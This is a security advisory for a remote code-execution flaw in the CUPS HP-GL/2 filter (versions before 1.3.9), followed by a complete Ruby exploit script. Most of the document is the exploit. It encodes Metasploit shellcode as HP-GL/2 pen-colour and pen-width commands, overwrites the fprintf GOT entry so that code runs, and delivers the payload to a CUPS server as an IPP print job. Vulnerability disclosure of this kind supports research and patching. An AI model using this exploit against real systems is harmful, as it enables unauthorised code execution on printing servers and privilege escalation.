source: http://www.securityfocus.com/bid/31688/info

CUPS is prone to a remote code-execution vulnerability caused by an error in the 'HP-GL/2 filter.

Attackers can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will likely cause a denial-of-service condition. Note that local users may also exploit this vulnerability to elevate privileges.

Successful remote exploits may require printer sharing to be enabled on the vulnerable system.

The issue affects versions prior to CUPS 1.3.9.

NOTE: This issue was previously discussed in BID 31681 (Apple Mac OS X 2008-007 Multiple Security Vulnerabilities), but has been assigned its own record to better document the vulnerability. 

#!/usr/bin/ruby -w

# CUPS 1.3.7 (HP-GL/2 filter) remote code execution
# gives uid=2(daemon) gid=7(lp) groups=7(lp)
# linux 2.6.25/randomize_va_space = 1, glibc 2.7
#
# An Introduction to HP-GL/2 Graphics
# http://www.tech-diy.com/HP%20Graphics%20Language.htm
# Internet Printing Protocol/1.1: Encoding and Transport
# http://tools.ietf.org/html/rfc2910
# Internet Printing Protocol/1.1: Model and Semantics
# http://tools.ietf.org/html/rfc2911

# :::::::::::::::::::::::::::::::::: setup ::::::::::::::::::::::::::::::::::

host = '127.0.0.1'
port = 631
printer = 'Virtual_Printer'

Pens_addr = 0x08073600		# objdump -T hpgltops | grep Pens$
fprintf_got = 0x080532cc	# objdump -R hpgltops | grep fprintf

# linux_ia32_exec - CMD=/bin/touch /tmp/yello Size=84, metasploit.com
# encoder=PexFnstenvSub, restricted chars: 0xff
shellcode =
	"\x2b\xc9\x83\xe9\xf1\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x7c" +
	"\x48\x22\xd6\x83\xeb\xfc\xe2\xf4\x16\x43\x7a\x4f\x2e\x2e\x4a\xfb" +
	"\x1f\xc1\xc5\xbe\x53\x3b\x4a\xd6\x14\x67\x40\xbf\x12\xc1\xc1\x84" +
	"\x94\x5e\x22\xd6\x7c\x67\x40\xbf\x12\x67\x56\xb9\x09\x2b\x4a\xf6" +
	"\x53\x3c\x4f\xa6\x53\x31\x47\xba\x10\x27\x22\x81\x2f\xc1\xc3\x1b" +
	"\xfc\x48\x22\xd6";

# :::::::::::::::::::::::::::::::::: code :::::::::::::::::::::::::::::::::::

# beacause of hpgl-attr.c:68-73 and 269-274
def CR_setup()
	"CR0,1,0,1,0,1;"
end

# PS is a bit tricky here. final weight of pen (PW code) is calculated as:
# weight*=hypot(ps[0],ps[1])/1016.0*72.0 (which is NOT hypot/73152.0),
# where ps0=72.0*arg1/1016.0 and ps1=72.0*arg2/1016.0.
# so, hoping to get things accurate I set multiplier to 1.0
def PS_setup()
	"WU1;" +		# set the units used for pen widths
	"RO0;" +		# (do not) rotate the plot
	"PS0,199.123455;";	# set the plot size
end

# alternative approach to fight floating point rounding errors
# first one seems to be more successful, though
def PS_setup_alt()
	"WU0;" +
	"RO0;";
end

# set the pen width (PS!)
def PW(width, pen)
	"PW#{width},#{pen};"
end

def PW_alt(width, pen)
	"PW#{width*25.4/72.0},#{pen};"
end

# "Set the pen color..."
def PC(pen, r, g, b)
	"PC#{pen},#{r},#{g},#{b};"
end

# we'll be storing shellcode in Pens[1024] static buffer
# typedef struct
# {
#   float rgb[3]; /* Pen color */
#   float width;  /* Pen width */
# } pen_t;
def memcpy(data)
	while (data.length % 16 != 0)
		data += "\x90";
	end
	s = ''
	a = 0, b = 0, i = 0
	data.unpack('f*').each { |f|
		case ((i += 1) % 4)
			when 1: a = f
			when 2: b = f
			when 3: s += PC(i/4, a, b, f)
			else s += PW(f, (i-1)/4)
		end
	}
	return s;
end

# overwrite all 16 bytes with the same value
def poke(addr, value)
	f = [value].pack('i').unpack('f')	# floatyfication!
	i = (addr-Pens_addr)/16
	return PC(i, f, f, f) + PW(f, i)
end

hpgl_data =
	"BP;" + # to be recognized by CUPS
	CR_setup() +
	PS_setup() +
	memcpy(shellcode) +
	poke(fprintf_got, Pens_addr) +
	PC(0, 0, 0, 0); # whatever

def attribute(tag, name, value)
	[tag].pack('C') +
	[name.length].pack('n') +
	name +
	[value.length].pack('n') +
	value
end

# tag - meaning (rfc2910#section-3.5)
# 0x42 nameWithoutLanguage
# 0x45 uri
# 0x47 charset
# 0x48 naturalLanguage
operation_attr =
	attribute(0x47, 'attributes-charset', 'utf-8') +
	attribute(0x48, 'attributes-natural-language', 'en-us') +
	attribute(0x45, 'printer-uri', "http://#{host}:#{port}/printers/#{printer}") +
	attribute(0x42, 'job-name', 'zee greeteengz') +
	attribute(0x42, 'document-format', 'application/vnd.hp-HPGL');

ipp_data =
	"\x01\x00" +		# version-number: 1.0
	"\x00\x02" +		# operation-id: Print-job
	"\x00\x00\x00\x01" +	# request-id: 1
	"\x01" +		# operation-attributes-tag
	operation_attr +
	"\x02" +		# job-attributes-tag
	"\x03" +		# end-of-attributes-tag
	hpgl_data;

http_request =
"""POST /printers/#{printer} HTTP/1.1
Content-Type: application/ipp
User-Agent: Internet Print Provider
Host: #{host}
Content-Length: #{ipp_data.length}
Connection: Keep-Alive
Cache-Control: no-cache
"""

require 'socket'
NL = "\r\n"

if (false)
	# ./hpgltops 0 none none 1 '' output.hpgl
	puts hpgl_data
	puts "[+] dumping HP/GL-2 into output.hpgl"
	f = File.new('output.hpgl', 'w')
	f.write(hpgl_data)
	f.close()
	exit(0)
end

puts "[+] connecting to #{host}:#{port}"
s = TCPSocket.open(host, port)
puts "[+] asking #{printer} for a printout"
http_request.each_line { |line|
	s.write(line.strip + NL)
}
s.write(NL)
s.write(ipp_data)
s.read(1)
s.close()
puts "[+] done"

